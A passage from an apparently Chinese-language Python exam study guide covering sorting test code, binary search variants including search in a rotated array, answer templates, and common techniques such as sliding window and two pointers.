    while i >= 0:
        index = arr[i] // exp
        output[count[index % 10] - 1] = arr[i]
        count[index % 10] -= 1
        i -= 1
    
    for i in range(n):
        arr[i] = output[i]

# 测试用例
test_arr = [64, 34, 25, 12, 22, 11, 90]
print("原数组:", test_arr)
print("堆排序:", heap_sort(test_arr.copy()))
print("计数排序:", counting_sort(test_arr.copy()))
print("基数排序:", radix_sort(test_arr.copy()))
```

### 7. 查找算法进阶

#### 二分查找变种
```python
def binary_search_first(arr, target):
    """查找第一个等于target的位置"""
    left, right = 0, len(arr) - 1
    result = -1
    
    while left <= right:
        mid = (left + right) // 2
        
        if arr[mid] == target:
            result = mid
            right = mid - 1  # 继续向左查找
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    
    return result

def binary_search_last(arr, target):
    """查找最后一个等于target的位置"""
    left, right = 0, len(arr) - 1
    result = -1
    
    while left <= right:
        mid = (left + right) // 2
        
        if arr[mid] == target:
            result = mid
            left = mid + 1  # 继续向右查找
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    
    return result

def binary_search_insert_position(arr, target):
    """查找插入位置"""
    left, right = 0, len(arr)
    
    while left < right:
        mid = (left + right) // 2
        
        if arr[mid] < target:
            left = mid + 1
        else:
            right = mid
    
    return left

def search_in_rotated_array(arr, target):
    """在旋转排序数组中查找"""
    left, right = 0, len(arr) - 1
    
    while left <= right:
        mid = (left + right) // 2
        
        if arr[mid] == target:
            return mid
        
        # 判断哪一半是有序的
        if arr[left] <= arr[mid]:  # 左半部分有序
            if arr[left] <= target < arr[mid]:
                right = mid - 1
            else:
                left = mid + 1
        else:  # 右半部分有序
            if arr[mid] < target <= arr[right]:
                left = mid + 1
            else:
                right = mid - 1
    
    return -1

# 测试用例
arr = [1, 2, 2, 2, 3, 4, 5]
target = 2
print(f"第一个{target}的位置:", binary_search_first(arr, target))
print(f"最后一个{target}的位置:", binary_search_last(arr, target))
print(f"{target}的插入位置:", binary_search_insert_position(arr, target))

rotated_arr = [4, 5, 6, 7, 0, 1, 2]
print(f"旋转数组中查找0:", search_in_rotated_array(rotated_arr, 0))
```

## 考试答题模板

### Python代码规范
```python
# 1. 函数定义模板
def function_name(parameters):
    """
    函数功能描述
    参数说明
    返回值说明
    """
    # 边界条件处理
    if not parameters:
        return default_value
    
    # 主要逻辑
    result = process(parameters)
    
    return result

# 2. 类定义模板
class ClassName:
    def __init__(self, parameters):
        self.attribute = parameters
    
    def method_name(self, parameters):
        # 方法实现
        pass

# 3. 算法复杂度分析模板
"""
时间复杂度：O(n)
空间复杂度：O(1)
算法思路：简要说明算法思想
"""
```

### 常用Python技巧
```python
# 1. 列表推导式
squares = [x**2 for x in range(10)]
filtered = [x for x in arr if x > 0]

# 2. 字典推导式
char_count = {char: text.count(char) for char in set(text)}

# 3. 双指针技巧
def two_pointers(arr):
    left, right = 0, len(arr) - 1
    while left < right:
        # 处理逻辑
        left += 1
        right -= 1

# 4. 滑动窗口
def sliding_window(arr, k):
    window_sum = sum(arr[:k])
    max_sum = window_sum
    
    for i in range(k, len(arr)):
        window_sum = window_sum - arr[i-k] + arr[i]
        max_sum = max(max_sum, window_sum)
    
    return max_sum

# 5. 递归模板
def recursive_function(n):
    # 基础情况
    if n <= 1:
        return base_case
    
    # 递归情况
    return combine(recursive_function(n-1), recursive_function(n-2))
```